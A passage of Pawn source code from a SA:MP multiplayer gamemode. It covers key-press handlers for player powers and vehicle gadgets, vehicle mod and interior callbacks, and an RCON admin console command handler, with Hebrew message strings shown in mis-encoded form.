					if(playerinfo[playerid][level] < neededLevel || playerinfo[playerid][energy] < neededEn)
					{
						format(string,sizeof(string)," :схшьф (%s) щЎщ°· фыхч с°юф %d",GetUPLTitle(playerinfo[playerid][upower],upLevel),upLevel);
						SendClientMessage(playerid,red,string);
						if(playerinfo[playerid][level] < neededLevel) format(string,sizeof(string)," .Єьщъ ьфщх· ьЇчх· с°ю· ∙чўя %d Єь юЁ· ьф∙·ю∙ с°юф цх ∙ь фыхч",neededLevel);
						else format(string,sizeof(string)," .рщя ьъ юёЇщў рЁ°тщф, фыхч ух°∙ %d",neededEn);
						SendClientMessage(playerid,red,string);
					}
					else
					{
						format(string,sizeof(string)," !%s - ф∙·ю∙· сыхч рхьшщюшщсщ с°юф %d",GetUPLTitle(playerinfo[playerid][upower],upLevel),upLevel);
						SendClientMessage(playerid,UltimatePowers[playerinfo[playerid][upower]][upHex],string);
						UseUltimatePower(playerid,playerinfo[playerid][upower],upLevel);
					}
				}
				playerinfo[playerid][charge] = -1;
			}
		}
		else if(playerinfo[playerid][upower2] != -1 && (newkeys == playerinfo[playerid][upowerkeys2] || oldkeys == playerinfo[playerid][upowerkeys2]))
		{
			if(newkeys == playerinfo[playerid][upowerkeys2])
			{
				format(string,sizeof(string)," ...(%s) ю·чщь ьшЄхя ыхч рхьшщюшщсщ ∙Ёщ",UltimatePowers[playerinfo[playerid][upower2]][upTitle]);
				SendClientMessage(playerid,UltimatePowers[playerinfo[playerid][upower2]][upHex],string);
				playerinfo[playerid][charge2] = 0;
				SetPlayerChatBubble(playerid,"...щхЎ° ыхч рхьшщюшщсщ",UltimatePowers[playerinfo[playerid][upower2]][upHex],20.0,3000);
			}
			if(oldkeys == playerinfo[playerid][upowerkeys2])
			{
				new upLevel = playerinfo[playerid][charge] / 2, maxLevel = GetUltimatePowerMaxLevel(playerinfo[playerid][upower2]), neededLevel = GetUPLNeededLevel(playerinfo[playerid][upower2],upLevel), neededEn = GetUPLEnCost(playerinfo[playerid][upower2],upLevel);
				if(upLevel > maxLevel) upLevel = maxLevel;
				if(upLevel > 0)
				{
					if(playerinfo[playerid][level] < neededLevel || playerinfo[playerid][energy] < neededEn)
					{
						format(string,sizeof(string)," :схшьф (%s) щЎщ°· фыхч ф∙Ёщ с°юф %d",GetUPLTitle(playerinfo[playerid][upower2],upLevel),upLevel);
						SendClientMessage(playerid,red,string);
						if(playerinfo[playerid][level] < neededLevel) format(string,sizeof(string)," .Єьщъ ьфщх· ьЇчх· с°ю· ∙чўя %d Єь юЁ· ьф∙·ю∙ с°юф цх ∙ь фыхч",neededLevel);
						else format(string,sizeof(string)," .рщя ьъ юёЇщў рЁ°тщф, фыхч ух°∙ %d",neededEn);
						SendClientMessage(playerid,red,string);
					}
					else
					{
						format(string,sizeof(string)," !%s - ф∙·ю∙· сыхч рхьшщюшщсщ ∙Ёщ с°юф %d",GetUPLTitle(playerinfo[playerid][upower2],upLevel),upLevel);
						SendClientMessage(playerid,UltimatePowers[playerinfo[playerid][upower2]][upHex],string);
						UseUltimatePower(playerid,playerinfo[playerid][upower2],upLevel);
					}
				}
				playerinfo[playerid][charge2] = -1;
			}
		}
		else if(playerinfo[playerid][upower3][0] != -1 && newkeys == DEFAULT_UPOWER3_KEYS)
		{
			UseUltimatePower(playerid,playerinfo[playerid][upower3][0],playerinfo[playerid][upower3][1]);
			playerinfo[playerid][upower3] = {-1,-1};
		}
	}
	if(playerinfo[playerid][upkeyschanging] > 0 && newkeys == 0)
	{
		switch(playerinfo[playerid][upkeyschanging])
		{
			case 1:
			{
				playerinfo[playerid][upowerkeys] = oldkeys;
				fsetint(fuser(playerid),"PlayerUPowerKeys",oldkeys);
				SendClientMessage(playerid,green," .юў∙щ фыхч фрхьшщюшщсщ ∙ьъ ф∙·Ёх ьюў∙щэ ∙сч°·");
			}
			case 2:
			{
				playerinfo[playerid][upowerkeys2] = oldkeys;
				fsetint(fuser(playerid),"PlayerUPowerKeys2",oldkeys);
				SendClientMessage(playerid,green," .юў∙щ фыхч фрхьшщюшщсщ ф∙Ёщ ∙ьъ ф∙·Ёх ьюў∙щэ ∙сч°·");
			}
		}
		playerinfo[playerid][upkeyschanging] = 0;
	}
	if(newkeys & KEY_SPRINT && playerinfo[playerid][raiseby] != INVALID_PLAYER_ID)
	{
		if(playerinfo[playerid][raisef] >= 10) StopRaise(playerinfo[playerid][raiseby]);
		else playerinfo[playerid][raisef]++;
	}
	if(playerinfo[playerid][godpower])
	{
		if(newkeys & KEY_FIRE && newkeys & KEY_WALK && GetPlayerWeapon(playerid) == 0)
		{
			new Float:p[3], Float:act[2];
			GetPlayerPos(playerid,act[0],act[1],p[2]);
			GetXYInFrontOfPlayer(playerid,p[0],p[1],2);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerInRangeOfPoint(i,2,p[0],p[1],p[2]))
			{
				if(playerinfo[i][pp]) i = playerid;
				ApplyAnimation(i,"SWORD","Sword_Hit_2",4.0999,0,1,1,0,1000);
				SetPlayerForwardVelocity(i,-1.5,0.4);
				GameTextForPlayer(i,"~r~ultra fist",200,3);
				Damage(i,50.0,playerid);
				break;
			}
		}
		if(newkeys & KEY_FIRE && newkeys & KEY_SPRINT && GetPlayerWeapon(playerid) == 0)
		{
			SetPlayerAttachedObject(playerid,aoslot_godeyeright,18643,1,0.360000,0.000000,0.029999,0.000000,0.000000,90.000000,1.000000,1.000000,1.000000);
			SetPlayerAttachedObject(playerid,aoslot_godeyeleft,18643,1,0.360000,0.000000,-0.029999,0.000000,0.000000,90.000000,1.000000,1.000000,1.000000);
			SetTimerEx("LaserEye",500,0,"ii",playerid,1);
		}
	}
	#if lagtest
		//LagTest_EndEx("OnPlayerKeyStateChangeE(%d)",newkeys);
	#endif
	if(newkeys & KEY_FIRE && !(oldkeys & KEY_FIRE)) playerinfo[playerid][opatest] = 1;
	if(playerinfo[playerid][insport] && newkeys & KEY_FIRE)
	{
		if(sportinfo[8] == playerid)
		{
			ApplyAnimation(playerid,"FIGHT_D","FightD_1",4.1,0,1,1,1,1);
			playerinfo[playerid][sportparam] = 1;
			SetTimerEx("SportShoot",100,0,"ii",playerid,0);
			SetTimerEx("SportShoot",200,0,"ii",playerid,1);
		}
		else
		{
			new Float:p[3];
			GetObjectPos(sportinfo[9],p[0],p[1],p[2]);
			if(IsPlayerInRangeOfPoint(playerid,2.5,p[0],p[1],p[2]))
			{
				AttachObjectToPlayer(sportinfo[9],playerid,0.3,0.3,0.0,0.0,0.0,0.0);
				SportUpdate(sportinfo[8] == INVALID_PLAYER_ID ? 8 : 7,playerid);
				sportinfo[8] = playerid;
			}
		}
	}
	if(playerinfo[playerid][usepower] && playerinfo[playerid][powerparam] > 0 && newkeys & KEY_SECONDARY_ATTACK)
	{
		SendClientMessage(playerid,green," .фЇёў· р· ф∙щюх∙ сыхч");
		StopUsingPower(playerid);
	}
	if((newkeys & KEY_JUMP && playerinfo[playerid][srin] && playerinfo[playerid][srstarted]) || ((newkeys & KEY_JUMP || newkeys & KEY_FIRE || newkeys & 128) && currentShow[0] != -1 && GetPlayerVirtualWorld(playerid) == world_show)) StopPlayer(playerid);
	#if lagtest
		//LagTest_EndEx("OnPlayerKeyStateChangeF(%d)",newkeys);
	#endif
	if((newkeys & KEY_YES || newkeys & KEY_NO) && (((GetPlayerState(playerid) == PLAYER_STATE_PASSENGER && IsPlayerUsingDB(playerid)) || (GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK))))
	{
		new wd[13][2], w = GetPlayerWeapon(playerid), s = GetWeaponSlot(w), acceptedSlots[] = {2,3,4,5,6}, first = acceptedSlots[0], last = acceptedSlots[sizeof(acceptedSlots)-1];
		if(isAcceptedDBWeapon(w))
		{
			for(new i = 0; i < 13; i++) GetPlayerWeaponData(playerid,i,wd[i][0],wd[i][1]);
			new found = w;
			if(newkeys & KEY_YES) // next
			{
				for(new i = s + 1; i <= last && found == w; i++) if(isAcceptedDBWeapon(wd[i][0])) found = wd[i][0];
				if(found == w) for(new i = first; i < s && found == w; i++) if(isAcceptedDBWeapon(wd[i][0])) found = wd[i][0];
				if(found != w)
				{
					SetPlayerArmedWeapon(playerid,found);
					playerinfo[playerid][getweapon] = found;
				}
			}
			else if(newkeys & KEY_NO) // previous
			{
				for(new i = s - 1; i >= first && found == w; i--) if(isAcceptedDBWeapon(wd[i][0])) found = wd[i][0];
				if(found == w) for(new i = last; i > s && found == w; i--) if(isAcceptedDBWeapon(wd[i][0])) found = wd[i][0];
				if(found != w)
				{
					SetPlayerArmedWeapon(playerid,found);
					playerinfo[playerid][getweapon] = found;
				}
			}
		}
	}
    if(playerinfo[playerid][sgcomp] != -1 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER && newkeys & KEY_FIRE)
	{
		switch(playerinfo[playerid][sgcomp])
		{
			case 0: // Infinite Nitro
			{
				UpdateNitro(playerid,GetPlayerVehicleID(playerid));
			}
			case 1: // Turbo
			{
				new Float:p[4], v = GetPlayerVehicleID(playerid), Float:vh;
				GetVehicleHealth(v,vh);
				SetVehicleForwardVelocity(v,3.0,0.0);
				GetVehiclePos(v,p[0],p[1],p[2]);
				GetVehicleZAngle(v,p[3]);
				GetXYInFrontOfPoint(p[0],p[1],p[3],-12.0);
				CreateExplosionVW(p[0],p[1],p[2],6,0.3,GetPlayerVirtualWorld(playerid));
				SetVehicleHealth(v,vh);
				playerinfo[playerid][sgcomp] = -1;
			}
			case 2: // Random Colors
			{
				playerinfo[playerid][cvcolor] = !playerinfo[playerid][cvcolor];
				PlaySound(playerid,1057);
				SendClientMessage(playerid,playerinfo[playerid][cvcolor] ? green : red,playerinfo[playerid][cvcolor] ? (" * Vehicle random colors ON.") : (" * Vehicle random colors OFF"));
			}
			case 3: // Vehicle Rockets
			{
				new rocket = -1, v = GetPlayerVehicleID(playerid), Float:p[4];
				for(new i = 0; i < 2 && rocket == -1; i++) if(vehicleinfo[v][vrockets][i] != -1 && IsValidObject(vehicleinfo[v][vrockets][i])) rocket = i;
				GetVehiclePos(v,p[0],p[1],p[2]);
				GetVehicleZAngle(v,p[3]);
				DestroyObject(vehicleinfo[v][vrockets][rocket]);
				vehicleinfo[v][vrockets][rocket] = CreateSObject(3790,p[0],p[1],p[2],0.0,0.0,p[3]);
				Streamer_Update(playerid);
				new id = FindPlayer(playerid,10,2.0);
				if(id == -1 || GetDistanceBetweenPlayers(playerid,id) <= 5) GetXYInFrontOfPoint(p[0],p[1],p[3],9.5);
				else
				{
					GetPlayerPos(id,p[0],p[1],p[2]);
					SetObjectToFaceCords(vehicleinfo[v][vrockets][rocket],p[0],p[1],p[2]);
				}
				objectinfo[vehicleinfo[v][vrockets][rocket]][odam] = 1;
				objectinfo[vehicleinfo[v][vrockets][rocket]][oeam] = 6;
				MoveSObject(vehicleinfo[v][vrockets][rocket],p[0],p[1],p[2],6.5);
				vehicleinfo[v][vrockets][rocket] = -1;
				if(vehicleinfo[v][vrockets][0] == -1 && vehicleinfo[v][vrockets][1] == -1) playerinfo[playerid][sgcomp] = -1;
			}
		}
	}
	if(newkeys & KEY_YES)
	{
		new Float:p[3], vid = -1;
		if(!IsPlayerInAnyVehicle(playerid))
		{
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetVehicleWithinDistance(playerid,p[0],p[1],p[2],40.0,vid);
			if(vid != -1) if(vehicleinfo[vid][tobein] > 0)
			{
				switch(vehicleinfo[vid][tobein])
				{
					case 1:
					{
						SetPlayerPos(playerid,1.5627,23.1112,1199.5938);
						SetPlayerFacingAngle(playerid,358.8634);
						SetPlayerInterior(playerid,1);
					}
				}
				GiveWeapon(playerid,46,0);
				playerinfo[playerid][invehicle] = vid;
				new wrld = -1;
				for(new i = 0; i < MAX_PLAYERS_ && wrld == -1; i++) if(IsPlayerConnected(i) && playerinfo[i][invehicle] == vid) wrld = GetPlayerVirtualWorld(i);
				if(wrld == -1)
				{
					wrld = GetEmptyWorld();
					vehicleinfo[vid][vtext][0] = Create3DTextLabel("ьЎЇщщф юсЄу ьчьхя\n~k~~CONVERSATION_NO~ ьчї",white,3.0257,27.2847,1199.5938,20.0,wrld,0);
					vehicleinfo[vid][vtext][1] = Create3DTextLabel("ьЎЇщщф юсЄу ьчьхя\n~k~~CONVERSATION_NO~ ьчї",white,0.4257,27.2847,1199.5938,20.0,wrld,0);
					vehicleinfo[vid][vtext][2] = Create3DTextLabel("ьЎЁщчф юфюшхё\n~k~~VEHICLE_ENTER_EXIT~ ьчї",white,1.5582,33.3250,1199.5938,20.0,wrld,0);
				}
				if(wrld != -1) SetPlayerVirtualWorld(playerid,world_normal);
			}
		}
	}
	#if lagtest
		//LagTest_EndEx("OnPlayerKeyStateChangeG(%d)",newkeys);
	#endif
	if(playerinfo[playerid][invehicle] != INVALID_VEHICLE_ID)
	{
		if(newkeys & KEY_SECONDARY_ATTACK)
		{
			if(playerinfo[playerid][watchingwindow] > 0)
			{
				SetCameraBehindPlayer(playerid);
				SetFreeze(playerid,0);
			}
			new Float:p[3], Float:v[3];
			GetVehiclePos(playerinfo[playerid][invehicle],p[0],p[1],p[2]);
			GetVehicleVelocity(playerinfo[playerid][invehicle],v[0],v[1],v[2]);
			SetPlayerInterior(playerid,0);
			SetPlayerVirtualWorld(playerid,0);
			playerinfo[playerid][invehicle] = INVALID_VEHICLE_ID;
			if(v[2] == 0.0) SetPlayerPos(playerid,p[0]+4.0,p[1],p[2]+3.0);
			else
			{
				SetPlayerPos(playerid,p[0],p[1],p[2]-5.0);
				GiveWeapon(playerid,46,0);
				SetPlayerArmedWeapon(playerid,46);
				format(string,sizeof(string)," [ЎЁщчф юфЁф! [тхсф: %.1f юш°",p[2]-5.0);
				SendClientMessage(playerid,green,string);
			}
		}
		else if(newkeys & KEY_NO)
		{
			if(playerinfo[playerid][watchingwindow] > 0)
			{
				SetCameraBehindPlayer(playerid);
				switch(vehicleinfo[playerinfo[playerid][invehicle]][tobein])
				{
					case 1: SetPlayerInterior(playerid,1);
				}
				SetFreeze(playerid,0);
				playerinfo[playerid][watchingwindow] = 0;
			}
			else
			{
				new Float:p[4], Float:d[2];
				GetVehiclePos(playerinfo[playerid][invehicle],p[0],p[1],p[2]);
				GetVehicleZAngle(playerinfo[playerid][invehicle],p[3]);
				d[0] = GetPlayerDistanceToPointEx(playerid,3.0257,27.2847,1199.5938), d[1] = GetPlayerDistanceToPointEx(playerid,0.4257,27.2847,1199.5938);
				if(d[0] > d[1])
				{
					playerinfo[playerid][watchingwindow] = 1;
					GetXYInFrontOfPoint(p[0],p[1],90.0,5.0);
				}
				else
				{
					playerinfo[playerid][watchingwindow] = 2;
					GetXYInFrontOfPoint(p[0],p[1],270.0,5.0);
				}
				SetPlayerCameraPos(playerid,p[0],p[1],p[2]);
				SetPlayerCameraLookAt(playerid,p[0],p[1],p[2]-10.0);
				SetPlayerInterior(playerid,0);
				SetFreeze(playerid,1);
				SetPlayerChatBubble(playerid,"ЎхЇф юфчьхя",grey,8.0,2000);
			}
		}
	}
	if(newkeys & KEY_NO)
	{
		if(playerinfo[playerid][pickup] != -1) if(pickupinfo[playerinfo[playerid][pickup]][pfunc] == 29)
		{
			if(grassdelay > 0)
			{
				format(string,sizeof(string)," .Ёёф ∙хс сЄху %d ∙Ёщх·",grassdelay);
				return SendClientMessage(playerid,red,string);
			}
			grassdelay = 10;
			for(new i = 0; i < grasses; i++) MoveReload(grass[i],50.0);
			Streamer_Update(playerid);
			PlaySound(playerid,1133);
		}
		if(playerinfo[playerid][infountain])
		{
			new dia[300];
			for(new i = 0; i < sizeof(ObjectMaterials); i++) format(dia,sizeof(dia),!i ? ("%s%s") : ("%s\n%s"),dia,ObjectMaterials[i][omName]);
			format(dia,sizeof(dia),"%s\nсч° ЎсЄ рў°рщ...",dia);
			ShowPlayerDialog(playerid,dialog_fountain,DIALOG_STYLE_LIST,@c(lightblue) "сч° ЎсЄ ьюц°ўф",dia,"∙щЁхщ ЎсЄ","ётх°");
		}
	}
	if(newkeys & KEY_FIRE && playerinfo[playerid][shavuot] > 0)
	{
		new Float:p[3], oid;
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		if(playerinfo[playerid][shavuot] == 1)
		{
			oid = CreateSObject(1598,p[0],p[1],p[2],0.0,0.0,0.0,.world = (worlds_dmz + dmz_shavuot));
			objectinfo[oid][oeam] = 15, objectinfo[oid][odmg] = 30.0;
		}
		else if(playerinfo[playerid][shavuot] == 2)
		{
			oid = CreateSObject(19345,p[0],p[1],p[2],0.0,0.0,0.0,.world = (worlds_dmz + dmz_shavuot));
			objectinfo[oid][oeam] = 16, objectinfo[oid][odmg] = 50.0;
		}
		objectinfo[oid][odam] = 1;
		GetXYInFrontOfPlayer(playerid,p[0],p[1],8.0);
		MoveSObject(oid,p[0],p[1],p[2],8.0);
		RemovePlayerAttachedObject(playerid,aoslot_shavuot3);
		playerinfo[playerid][shavuot] = 0;
	}
	if(newkeys & KEY_NO && playerinfo[playerid][iadminot][1] > 0)
	{
		assert IsPlayerMAdmin(playerid);
		new param = playerinfo[playerid][iadminot][2];
		switch(playerinfo[playerid][iadminot][1])
		{
			case adminot_newreport:
			{
				if(!IsPlayerConnected(playerinfo[param][reportid])) ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ущххч чу∙",@c(green) ".фущххч Ёьўч рх ∙ф∙чўя щщЎр юф∙°·","ётх°","");
				else
				{
					format(string,sizeof(string),@c(red) ":[ID: %03d] %s Єь [ID: %03d] %s-фущххч ∙Ё∙ьч ю\n%s",playerinfo[param][reportid],GetName(playerinfo[param][reportid]),param,GetName(param),playerinfo[param][report]);
					ShowPlayerDialog(playerid,dialog_takereport,DIALOG_STYLE_MSGBOX,@c(lightblue) "ущххч чу∙",string,"ўсь ущххч","ётх°");
				}
			}
			case adminot_minority: ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "!юЄш рующЁщэ",@c(red) ".щ∙ юЄш юущ рующЁщэ с∙°·. Ёр ьЁёх· ьф∙щт Єху ∙щ·чс°х","ётх°","");
			case adminot_adv: command(playerid,"/aadv");
			case adminot_cheating:
			{
				format(string,sizeof(string),"/spec %d",param);
				command(playerid,string);
			}
		}
		if(playerinfo[playerid][iadminot][1] != adminot_newreport) playerinfo[playerid][iadminot][0] = 0, playerinfo[playerid][iadminot][2] = -1;
        playerinfo[playerid][iadminot][1] = 0;
		TextDrawHideForPlayer(playerid,adminot);
		PlaySound(playerid,1056);
	}
	if(playerinfo[playerid][selectingpos][0] > 0 && playerinfo[playerid][clan] > 0 && claninfo[playerinfo[playerid][clan]][cvalid])
	{
		new Float:p[3], bool:sf = false;
		if(newkeys & KEY_NO)
		{
			if(playerinfo[playerid][selectingpos][0] == 3) sf = true;
			playerinfo[playerid][selectingpos][0] = -1, playerinfo[playerid][selectingpos][1] = 0;
			ClanDialog(playerid,clan_not,@c(green) ".сщшь· р· счщ°· фющўхэ",playerinfo[playerid][selectingpos][2]);
			PlaySound(playerid,1085);
		}
		else if(newkeys & KEY_YES && (playerinfo[playerid][selectingpos][0] == 1 || playerinfo[playerid][selectingpos][0] == 3))
		{
			if(playerinfo[playerid][selectingpos][0] == 3) sf = true;
			else GetPlayerPos(playerid,p[0],p[1],p[2]);
			DoneSelectingPos(playerid,p[0],p[1],p[2]);
		}
		if(sf)
		{
			StopFlyMode(playerid,p[0],p[1],p[2]);
			SetPlayerPos(playerid,p[0],p[1],p[2]);
			playerinfo[playerid][flytype] = fmt_none;
		}
	}
	if(playerinfo[playerid][flymode][0] && playerinfo[playerid][flytype] == fmt_admin)
	{
		new Float:p[3];
		if(newkeys & KEY_SPRINT)
		{
			StopFlyMode(playerid,p[0],p[1],p[2]);
			SetPlayerPos(playerid,p[0],p[1],p[2]);
		}
		else SendClientMessage(playerid,grey," (~k~~PED_SPRINT~ ьёщхэ ьчї)");
		playerinfo[playerid][flytype] = fmt_none;
	}
	if(playerinfo[playerid][lasteupdate][1] > 0 && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && (newkeys & KEY_SPRINT || newkeys & KEY_JUMP)) playerinfo[playerid][lasteupdate][1] = 0;
	playerinfo[playerid][pkeys][0] = newkeys, playerinfo[playerid][pkeys][1] = oldkeys;
	#if lagtest
		//LagTest_EndEx("OnPlayerKeyStateChangeH(%d)",newkeys);
	#endif
	//if(debugstate) printf("OnPlayerKeyStateChange(%s(%d),%d,%d) end",GetName(playerid),playerid,newkeys,oldkeys);
	return 1;
}
//=[OnVehiclePaintjob]==========================================================
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	if(debugstate) printf("OnVehiclePaintjob(%s(%d),%s(%d),%d) start",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,paintjobid);
	GetVehicleHealth(vehicleid,vehicleinfo[vehicleid][vhealth]);
	vehicleinfo[vehicleid][vpj] = paintjobid;
	if(debugstate) printf("OnVehiclePaintjob(%s(%d),%s(%d),%d) end",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,paintjobid);
	return 1;
}
//=[OnVehicleRespray]===========================================================
public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	if(debugstate) printf("OnVehicleRespray(%s(%d),%s(%d),%d,%d) start",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,color1,color2);
	GetVehicleHealth(vehicleid,vehicleinfo[vehicleid][vhealth]);
	vehicleinfo[vehicleid][newvcol][0] = color1, vehicleinfo[vehicleid][newvcol][1] = color2;
	if(debugstate) printf("OnVehicleRespray(%s(%d),%s(%d),%d,%d) end",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,color1,color2);
	return 1;
}
//=[OnVehicleMod]===============================================================
public OnVehicleMod(playerid, vehicleid, componentid)
{
	if(VMC_OnVehicleMod(playerid,vehicleid,componentid)) return 1;
	//if(!playerinfo[playerid][admin]) return SendClientMessage(playerid,red,".рёх° ь∙Ї° р· ф°ыс срхЇя цюЁщ, ф°ыс Єы∙щх щЄ∙ф ёЇрхя ючу∙")/*,SetKick(playerid,INVALID_PLAYER_ID,"ч∙у ьЎщш' - ∙щЇх° ь°ыс")*/,SetVehicleToRespawn(vehicleid);
	if(debugstate) printf("OnVehicleMod(%s(%d),%s(%d),%d) start",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,componentid);
	GetVehicleHealth(vehicleid,vehicleinfo[vehicleid][vhealth]);
	if(!GetPlayerInterior(playerid)) Cheat(playerid,"Vehicle Mod Hack",2);
	switch(componentid)
	{
	    case 1008..1010: if(IsPlayerInInvalidNosVehicle(playerid)) RemoveVehicleComponent(vehicleid, componentid);
	}
	if(!IsComponentidCompatible(GetVehicleModel(vehicleid), componentid)) RemoveVehicleComponent(vehicleid, componentid);
	if(debugstate) printf("OnVehicleMod(%s(%d),%s(%d),%d) end",GetName(playerid),playerid,GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,componentid);
	return 1;
}
//=[OnEnterExitModShop]=========================================================
public OnEnterExitModShop(playerid, enterexit, interiorid)
{
	if(debugstate) printf("OnEnterExitModShop(%s(%d),%d,%d) start",GetName(playerid),playerid,enterexit,interiorid);
	VMC_OnEnterExitModShop(playerid,enterexit);
	if(debugstate) printf("OnEnterExitModShop(%s(%d),%d,%d) end",GetName(playerid),playerid,enterexit,interiorid);
	return 1;
}
//=[OnPlayerInteriorChange]=====================================================
public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	if(debugstate) printf("OnPlayerInteriorChange(%s(%d),%d,%d) start",GetName(playerid),playerid,newinteriorid,oldinteriorid);
	#if lagtest
		LagTest_Start("OnPlayerInteriorChange");
	#endif
	playerinfo[playerid][dontac] = 5;
	if(!IsPlayerInAnyVehicle(playerid) && oldinteriorid == 0 && (newinteriorid == 1 || newinteriorid == 4 || newinteriorid == 6)) SetTimerEx("ResetAmmu",1000,0,"d",playerid);
	if(!playerinfo[playerid][recptimer]) playerinfo[playerid][recptimer] = 2;
	if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	{
		SetPlayerArmedWeapon(playerid,PlayerHasWeapon(playerid,1) ? 1 : 0);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && GetPlayerState(i) == PLAYER_STATE_SPECTATING && playerinfo[i][spectate] == playerid) SetPlayerInterior(i,newinteriorid);
		if(newinteriorid != 0 && playerinfo[playerid][pet][2])
		{
			new Float:p[4];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetPlayerFacingAngle(playerid,p[3]);
			if(playerinfo[playerid][pet][3]) StopPetAttacking(playerid);
			if(IsValidObject(playerinfo[playerid][pet][1])) DestroyObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][2] = 0;
			playerinfo[playerid][pet][3] = 0;
		}
		if(!playerinfo[playerid][changedinterior])
		{
			if(playerinfo[playerid][inwwe])
			{
				playerinfo[playerid][inwwe] = 0;
				SetPlayerInterior(playerid,oldinteriorid);
				playerinfo[playerid][inwwe] = 1;
				new n = wweinfo[4] * 2;
				SetPlayerPos(playerid,WWEPositions[n][0],WWEPositions[n][1],WWEPositions[n][2]);
				SetPlayerFacingAngle(playerid,WWEPositions[n][3]);
			}
		}
	}
	/*if(playerinfo[playerid][inact]) if(!IsPlayerMAdmin(playerid) && !playerinfo[playerid][inbriefcase] && !playerinfo[playerid][waitbriefcase])
	{
		new string[M_S];
		OutOfActivity(playerid);
		format(string,sizeof(string)," *** (°юрх·: щЎщрф ююсЁф) %s фхЎр юфЇЄщьх· Єь щущ %s",botname,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
	}*/
	playerinfo[playerid][dontac] = 5;
	playerinfo[playerid][changedinterior] = 0;
	#if lagtest
		LagTest_End("OnPlayerInteriorChange");
	#endif
	if(debugstate) printf("OnPlayerInteriorChange(%s(%d),%d,%d) end",GetName(playerid),playerid,newinteriorid,oldinteriorid);
	return 1;
}
//=[OnRconCommand_GM]===========================================================
forward OnRconCommand_GM(cmd[]);
public OnRconCommand_GM(cmd[])
{
	if(debugstate) printf("OnRconCommand_GM(%s) start",cmd);
	if(cmd[0] == '/')
	{
		if(cmd[1] == 0) return print(" /[String:command]");
		print(!OnPlayerCommandText(ConsoleID,cmd) ? ("Failed.") : ("Done."));
		return 1;
	}
	if(cmd[0] == '!')
	{
		if(cmd[1] == 0) return print(" /[String:text]");
		print(!OnPlayerText(ConsoleID,cmd[1]) ? ("Failed.") : ("Done."));
		return 1;
	}
	new cmdEx[256], idx;
	cmdEx = strtok(cmd,idx);
	if(equal(cmd,"help"))
	{
		print("  RCON Help:");
		print("  cmdlist :Show the SA:MP RCON commands list.");
		print("  cmdlist2 :Show the gamemode RCON commands list.");
		print("  varlist :Show the SA:MP variables.");
		print("  debug [on/off] :Start or end the debug actions.");
		print("  '/' prefix: Use gamemode commands (example: /helpmsg 2).");
		print("  '!' prefix: Write to chat (example: !Hello world).");
		return 1;
	}
	if(equal(cmd,"cmdlist2"))
	{
		print("  Commands:");
		print("  freeze [playerid]");
		print("  unfreeze [playerid]");
		print("  sethealth [playerid] [health 0 - 100]");
		print("  setarmour [playerid] [armour 0 - 100]");
		print("  setmoney [playerid] [money 0 - 999999999]");
		print("  setwanted [playerid] [wanted 0 - 6]");
		print("  lockserv [0/1]");
		print("  kickall");
		print("  kicksome [playerid] [playerid] etc...");
		print("  admins");
		print("  setcolor [playerid] [color]");
		print("  setname [playerid] [new name]");
		print("  a [message]");
		return 1;
	}
	if(equal(cmdEx,"freeze"))
	{
		new id;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" freeze [Int:playerid]");
		id = ReturnUser(cmdEx,ConsoleID);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		SetFreeze(id,1);
		return 1;
	}
	if(equal(cmdEx,"unfreeze"))
	{
		new id;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" freeze [Int:playerid]");
		id = ReturnUser(cmdEx,ConsoleID);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		SetFreeze(id,0);
		return 1;
	}
	if(equal(cmdEx,"sethealth"))
	{
		new id, Float:health;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" sethealth [Int:playerid] [Float:health 0 - 100]");
		id = ReturnUser(cmdEx,ConsoleID);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" sethealth [Int:playerid] [Float:health 0 - 100]");
		health = floatstr(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(health < 0 || health > 100) return print(" The health must be 0 - 100.");
		SetPlayerHealth(id,health);
		return 1;
	}
	if(equal(cmdEx,"setarmour"))
	{
		new id, Float:armour2;
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setarmour [Int:playerid] [Float:armour 0 - 100]");
		id = ReturnUser(cmdEx,ConsoleID);
		cmdEx = strtok(cmd,idx);
		if(!strlen(cmdEx)) return print(" setarmour [Int:playerid] [Float:armour 0 - 100]");
		armour2 = floatstr(cmdEx);
		if(!IsPlayerConnected(id)) return print(" Invalid player ID.");
		if(armour2 < 0 || armour2 > 100) return print(" The armour must be 0 - 100.");
		SetPlayerArmour(id,armour2);
		return 1;
	}
	/*if(equal(cmdEx,"setmoney"))
	{
		new id, rmoney;
		cmdEx = strtok(cmd,idx);
